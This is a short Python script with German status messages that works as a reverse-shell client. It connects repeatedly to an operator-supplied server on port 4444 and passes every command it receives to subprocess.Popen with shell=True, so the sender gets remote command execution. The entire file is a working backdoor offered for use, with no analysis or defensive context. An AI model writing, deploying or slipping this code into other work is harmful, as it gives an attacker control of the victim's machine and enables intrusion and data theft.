import socket
import time
import subprocess

def main():
    server_ip = '' # Add your ip adress here Not public ip
    server_port = 4444
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            print("Verbunden mit Server.")
            while True:
                command = s.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    s.close()
                    return
                
                else:
                    subprocess.Popen(command, shell=True)
                
        except:
            print("Verbindung fehlgeschlagen. Neuversuch in 5 Sekunden...")
            time.sleep(5)  # Warte vor erneutem Verbindungsversuch
            continue  # Automatisch weiter versuchen

if __name__ == "__main__":
    main()   